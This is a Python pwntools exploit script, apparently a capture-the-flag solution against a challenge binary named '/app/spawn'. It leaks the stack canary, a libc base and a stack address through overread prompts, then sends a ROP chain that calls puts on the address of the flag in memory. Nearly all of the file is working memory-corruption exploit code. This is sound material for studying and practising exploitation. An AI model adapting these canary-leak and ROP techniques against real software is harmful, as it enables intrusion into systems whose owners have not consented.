import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set follow-fork-mode child\n'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)


offset = 74
elf = ELF("/app/spawn")
libc = ELF("./libc.so.6")
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])

p = process("/app/spawn")
#debug(0x1213)
sa("vironment variable:", "a" * 9)
ru("a" * 9)
canary = u64(b'\x00' + rc(7))
log.success(hex(canary))

sa("vironment variable:", "a" * 0x18)
ru("a" * 0x18)
libc.address = u64(rc(6) + b'\x00\x00') - 0x280d0
log.success(hex(libc.address))

sa("vironment variable:", "a" * 0x20)
ru("a" * 0x20)
stack_leak = u64(rc(6) + b'\x00\x00')
stack_end = stack_leak - (stack_leak & 0xfff) + 0x2000
flag_addr = stack_end - offset
log.success(hex(flag_addr))

rop = ROP(libc)

payload = flat({
    0x08: canary,
    0x18: [rop.rdi[0], flag_addr, libc.sym["puts"]]
})

sa("ter feedback for this challenge below", payload)
p.interactive()
